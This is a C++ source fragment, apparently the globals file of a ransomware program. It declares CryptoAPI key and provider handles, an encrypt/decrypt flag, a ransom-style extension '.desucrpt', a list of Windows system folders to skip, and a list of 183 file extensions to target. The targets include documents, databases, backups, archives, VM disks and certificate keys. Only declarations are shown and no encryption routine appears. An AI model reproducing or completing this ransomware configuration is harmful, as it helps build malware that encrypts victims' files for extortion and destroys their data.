#include "globals.h"

#include "stdafx.h"
BOOL action; //TRUE = encrypt, FALSE=decrypt
std::vector<std::wstring> filesDB;
_WIN32_FIND_DATAW curItem;
TCHAR curPath[MAX_PATH];
HCRYPTKEY keyHandle;
//HANDLE statFileHandle;
std::wstring keyContainerPath;
HCRYPTKEY xchgKeyHandle;
DWORD keyBlobLen;
HCRYPTPROV provPtr;
const std::wstring encExt = L".desucrpt";
LPWSTR ignoreDirs[16] = {
	L"..",
	L".",
	L"Default",
	L"All Users",
	L"Content.IE5",
	L"Temporary Internet Files",
	L"Local Settings",
	L"AppData",
	L"Program Files (x86)",
	L"Program Files",
	L"Windows",
	L"Microsoft",
	L"Program Data",
	L"ProgramData",
	L"Intel",
	L"$Recycle.Bin"
};
LPWSTR fileExts[183] = {
	L".doc", L".docx", L".xls", L".xlsx", L".ppt", L".pptx", L".pst",
	L".ost", L".msg", L".eml", L".vsd", L".vsdx", L".txt", L".csv",
	L".rtf", L".123", L".wks", L".wk1", L".pdf", L".dwg", L".onetoc2",
	L".snt", L".jpeg", L".jpg", L".docb", L".docm", L".dot", L".dotm",
	L".dotx", L".xlsm", L".xlsb", L".xlw", L".xlt", L".xlm", L".xlc",
	L".xltx", L".xltm", L".pptm", L".pot", L".pps", L".ppsm", L".ppsx",
	L".ppam", L".potx", L".potm", L".edb", L".hwp", L".602", L".sxi",
	L".sti", L".sldx", L".sldm", L".sldm", L".vdi", L".vmdk", L".vmx",
	L".gpg", L".aes", L".ARC", L".PAQ", L".bz2", L".tbk", L".bak", L".tar",
	L".tgz", L".gz", L".7z", L".rar", L".zip", L".backup", L".iso", L".vcd",
	L".bmp", L".png", L".gif", L".raw", L".cgm", L".tif", L".tiff", L".nef",
	L".psd", L".ai", L".svg", L".djvu", L".m4u", L".m3u", L".mid", L".wma",
	L".flv", L".3g2", L".mkv", L".3gp", L".mp4", L".mov", L".avi", L".asf",
	L".mpeg", L".vob", L".mpg", L".wmv", L".fla", L".swf", L".wav", L".mp3",
	L".sh", L".class", L".jar", L".java", L".rb", L".asp", L".php", L".jsp",
	L".brd", L".sch", L".dch", L".dip", L".pl", L".vb", L".vbs", L".py",
	L".ps1", L".bat", L".cmd", L".js", L".asm", L".h", L".pas", L".cpp",L".c",L".css",
	L".html",
	L".cs", L".suo", L".sln", L".ldf", L".mdf", L".ibd", L".myi", L".myd", L".frm",
	L".odb", L".dbf", L".db", L".mdb", L".accdb", L".sql", L".sqlitedb", L".sqlite3",
	L".asc", L".lay6", L".lay", L".mml", L".sxm", L".otg", L".odg", L".uop", L".std",
	L".sxd", L".otp", L".odp", L".wb2", L".slk", L".dif", L".stc", L".sxc", L".ots",
	L".ods", L".3dm", L".max", L".3ds", L".uot", L".stw", L".sxw", L".ott", L".odt",
	L".pem", L".p12", L".csr", L".crt", L".key", L".pfx", L".der", L".dat" };